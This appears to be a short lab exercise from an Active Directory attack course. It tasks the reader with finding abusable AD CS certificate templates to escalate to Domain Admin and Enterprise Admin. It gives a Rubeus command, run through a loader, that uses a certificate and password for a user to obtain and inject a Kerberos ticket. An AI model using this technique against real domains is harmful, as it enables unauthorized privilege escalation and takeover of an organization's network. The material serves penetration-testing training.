
Task 
• Check if AD CS is used by the target forest and find any vulnerable/abusable templates. 
• Abuse any such template(s) to escalate to Domain Admin and Enterprise Admin.


```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /user:pawadmin /certificate:C:\AD\Tools\pawadmin.pfx /password:SecretPass@123 /nowrap /ptt
```
